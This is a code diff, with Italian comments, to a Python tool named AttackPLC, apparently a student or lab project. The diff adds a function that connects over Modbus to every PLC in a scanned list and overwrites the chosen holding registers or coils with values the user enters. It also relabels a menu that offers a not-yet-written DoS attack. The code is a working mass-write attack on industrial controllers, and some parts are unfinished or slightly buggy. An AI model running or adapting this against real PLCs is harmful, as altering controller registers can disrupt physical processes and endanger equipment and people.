@@ -378,6 +378,115 @@ class AttackPLC:
     mb.close()
     input("Done. Press Enter to continue ")
 
+  """
+  Cambio il valore di un registro sulla PLC
+  """
+  def changeRegisterValue(self, single_plc=False):
+    if(single_plc == False):
+      self.scan_is_present()
+
+      print("Available registers: ")
+      print(" - Holding Output Registers: from %QW0 to %QW9")
+      print(" - Coils: from %QX0.0 to %QX0.7")
+      print("\n")
+      choice = input("What do you want to attack? [coil / register]: ")
+
+      """
+      while(choice != "coil" or choice != "register"):
+        print(choice)
+        print("Invalid choice")
+        choice = input("What do you want to attack? [coil / register]: ")
+      """
+
+      # Assumo che se faccio un attacco di massa su tutte
+      # le PLC queste siano uguali tra loro, o quantomeno
+      # la maggior parte
+      if(choice == "register"):
+        opt = "register (0-9)"
+      else:
+        opt = "coil (0-7)"
+
+      register = input(f"Select {opt}: ")
+      value = input("Enter new value: ")
+      print("\n")
+
+      with open('plc_registers.json', 'r') as pl:
+        plc_list = pl.read()
+
+      plc_list = json.loads(plc_list)
+
+      # Mi connetto a tutte le PLC della lista
+      for plc in plc_list:
+        print(f"Connecting to {plc}")
+
+        mb = ModbusClient(plc, 502)
+        mb.connect()
+
+        # La scrittura posso farla solo su Holding/Output Registers e Coils...
+        if(choice == "register"):
+          print(f"Value found during the previous scan: {plc_list[plc]['HoldingOutputRegisters']['%QW' + register]}")
+          actual_register_value = mb.read_holdingregisters(int(register), 1)
+          print(f"Current %QW{register} register value on PLC: {actual_register_value}. Writing new value ")
+        else:
+          print(f"Value found during the previous scan: {plc_list[plc]['Coils']['%QX0.' + register]}")
+          actual_register_value = mb.read_coils(int(register), 1)
+          print(f"Current %QX0.{register} register value on PLC: {actual_register_value}. Writing new value ")
+
+        try:
+          if(choice == "register"):
+            mb.write_single_register(int(register), int(value))
+          else:
+            mb.write_single_coil(int(register), bool(value))
+
+        except Exception as e:
+          print(e)
+          print("Error writing on the PLC")
+
+        mb.close()
+
+    else:
+      self.scan_is_present()
+
+      with open('plc_list.json', 'r') as pl:
+        plc_list = pl.read()
+
+      plc_list = json.loads(plc_list)
+
+      print("Available PLCs: ")
+      counter = 1
+      for i in plc_list:
+        #if(os.path.exists(f'{plc_list[plc]}.json')):
+        print(f'{counter} - {plc_list[i]}')
+
+      choice = input("Select PLC: ")
+
+      if(not os.path.exists(f'{plc_list[str(choice)]}.json')):
+        new_scan = input("Scan not found. Perform a new scan for this PLC? [y/n] ")
+        if(new_scan == 'n' or new_scan == 'N'):
+          return
+        else:
+          self.scan_single_plc()
+
+      with open(f'{plc_list[str(choice)]}.json', 'r') as sp:
+        plc = sp.read()
+
+      plc = json.loads(plc)
+      print(plc)
+
+
+
+
+
+
+    input("Done. Presse Enter to continue: ")
+
+  """
+  Richiamo i tipi di attacco alle PLC
+  """
+  def attack_all_PLC(self, mb, single_plc=False):
+    pass
+
+
 
 """
 Definisco il main. Che poi è il menu da cui richiamo
@@ -392,10 +501,10 @@ def main():
 
     print("==== Attack PLC - Menu ====")
     print("1 - Find active PLCs")
-    print("2 - Scan PLCs registers")
-    print("3 - Scan single PLC")
-    print("4 - Change register value (single PLC)")
-    print("5 - DoS attack (single PLC)")
+    print("2 - Scan all PLCs registers")
+    print("3 - Scan single PLC registers")
+    print("4 - Modify Registers")
+    print("5 - DoS Attack to a register")
     print("6 - Exit\n")
     choice = input("Enter your choice: ")
 
@@ -406,7 +515,7 @@ def main():
     elif(choice == "3"):
       ap.scan_single_plc()
     elif(choice == "4"):
-      pass
+      ap.changeRegisterValue(True)
     elif(choice == "5"):
       pass
     elif(choice == "6"):
